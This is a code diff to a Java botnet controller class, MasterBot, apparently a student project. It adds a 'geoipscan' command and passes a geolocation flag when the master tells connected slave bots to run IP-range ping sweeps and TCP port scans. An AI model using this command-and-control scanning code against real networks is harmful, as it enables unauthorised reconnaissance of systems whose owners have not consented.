@@ -13,6 +13,7 @@ public class MasterBot extends Thread
 	static HashMap<String, ArrayList<Socket>> slavetoRemote = new HashMap<String, ArrayList<Socket>>();
 	static ArrayList<Socket> clientList = new ArrayList<>();
 	static SlaveBot b = new SlaveBot();
+	static boolean geolocation = false;
 //--constructor--------------------------------------------------------------------------------------------------------------------------------
 	public MasterBot()
 	{
@@ -80,19 +81,35 @@ public class MasterBot extends Thread
 		}
 	}
 //--printIpScan--------------------------------------------------------------------------------------------------------------------------------
-	void printIpScan (ArrayList<String> listOfResponsdedTarget)
+	void printIpScan (ArrayList<String> listOfResponsdedTarget, boolean isGeoTrue)
 	{
 		System.out.println("Output for IP Scan.....");
-		if(listOfResponsdedTarget.size() == 0)
+		if(isGeoTrue)
 		{
-			System.out.println("No servers responded to the ping request.");
+			if(listOfResponsdedTarget.size() == 0)
+			{
+				System.out.println("No servers responded to the ping request.");
+			}
+			else
+			{
+				System.out.println("Total Number of Respondents : " + listOfResponsdedTarget.size());
+				System.out.println(">");
+			}
 		}
-		else
+		else if(!isGeoTrue)
 		{
-			System.out.println(listOfResponsdedTarget);
+			if(listOfResponsdedTarget.size() == 0)
+			{
+				System.out.println("No servers responded to the ping request.");
+			}
+			else
+			{
+				System.out.println(listOfResponsdedTarget);
+				System.out.println("Total Number of Respondents : " + listOfResponsdedTarget.size());
+				System.out.println(">");
+			}
 		}
-		System.out.println("Total Number of Respondents : " + listOfResponsdedTarget.size());
-		System.out.println(">");
+		
 	}
 //--printtcpPoetScan---------------------------------------------------------------------------------------------------------------------------
 	void printtcpPortScan (ArrayList<String> activePorts)
@@ -107,7 +124,7 @@ public class MasterBot extends Thread
 			System.out.println(activePorts);
 		}
 		System.out.println("Total Number of Active Ports : " + activePorts.size());
-		System.out.println(">");
+		System.out.print(">");
 	}	
 //--main---------------------------------------------------------------------------------------------------------------------------------------
 	public static void main(String[] args) 
@@ -475,6 +492,60 @@ public class MasterBot extends Thread
 					System.out.println("Shell Terminated.");
 					System.exit(0);
 				}
+//--------------geoipscan function logic
+				else if (commandLine.startsWith("geoipscan"))
+				{
+					//String array to capture arguments
+					String[] dataArray = commandLine.split("\\s+");
+					geolocation = true;
+					String range = null;
+					
+					if(noOfSlavesConnected == 0)
+					{
+						System.out.println("No Slaves are currently connected to the server.\n");
+						continue;
+					}
+					
+					//if number of arguments are invalid
+					if(dataArray.length != 3)
+					{
+						System.out.println("Invalid Format. Type 'help' for more details.\n");
+						continue;
+					}
+					
+					if(dataArray.length == 3)
+					{
+						slaveIPAddress = dataArray[1];
+						range = dataArray[2];		
+						System.out.println("geoipscan is running in background.");
+					}
+					//for all slaves (Example : ipscan all 64.233.162.127-64.233.162.152)
+					if(slaveIPAddress.equalsIgnoreCase("all"))
+					{
+						for(int i=0; i<clientList.size(); i++)
+						{
+							b.ipScan(clientList.get(i), range, geolocation);
+						}	
+					}
+					//for specific slaves (Example : ipscan 127.0.0.1:52317 64.233.162.127-64.233.162.152)
+					if(!slaveIPAddress.equalsIgnoreCase("all"))
+					{
+						String line;
+						for(int i=0; i<clientList.size(); i++)
+						{
+							line = "/"+slaveIPAddress;
+							if(line.equalsIgnoreCase(clientList.get(i).getRemoteSocketAddress().toString()))
+							{
+								b.ipScan(clientList.get(i), range, geolocation);
+							}
+							else
+							{
+								System.out.println("No such slave is connected to the Master.");
+							}
+						}
+					}
+					continue;
+				}
 //--------------ipscan function logic
 				else if (commandLine.startsWith("ipscan"))
 				{
@@ -501,15 +572,13 @@ public class MasterBot extends Thread
 						slaveIPAddress = dataArray[1];
 						range = dataArray[2];		
 						System.out.println("ipscan is running in background.");
-						System.out.println("Results will be posted soon.....");
-						System.out.println("Meanwhile, other commands can be used. Type 'help' for available commands.");
 					}
 					//for all slaves (Example : ipscan all 64.233.162.127-64.233.162.152)
 					if(slaveIPAddress.equalsIgnoreCase("all"))
 					{
 						for(int i=0; i<clientList.size(); i++)
 						{
-							b.ipScan(clientList.get(i), range);
+							b.ipScan(clientList.get(i), range, geolocation);
 						}	
 					}
 					//for specific slaves (Example : ipscan 127.0.0.1:52317 64.233.162.127-64.233.162.152)
@@ -521,7 +590,7 @@ public class MasterBot extends Thread
 							line = "/"+slaveIPAddress;
 							if(line.equalsIgnoreCase(clientList.get(i).getRemoteSocketAddress().toString()))
 							{
-								b.ipScan(clientList.get(i), range);
+								b.ipScan(clientList.get(i), range, geolocation);
 							}
 							else
 							{
@@ -531,7 +600,7 @@ public class MasterBot extends Thread
 					}
 					continue;
 				}
-//--------------ipscan function logic
+//--------------tcpportscan function logic
 				else if (commandLine.startsWith("tcpportscan"))
 				{
 					//String array to capture arguments
@@ -556,8 +625,6 @@ public class MasterBot extends Thread
 						targetIPAddress = dataArray[2];
 						portRange = dataArray[3];
 						System.out.println("tcpportscan is running in background.");
-						System.out.println("Results will be posted soon.....");
-						System.out.println("Meanwhile, other commands can be used. Type 'help' for available commands.");
 					}
 					//for all slaves (Example : tcpportscan all www.google.com 8000-9000)
 					if(slaveIPAddress.equalsIgnoreCase("all"))
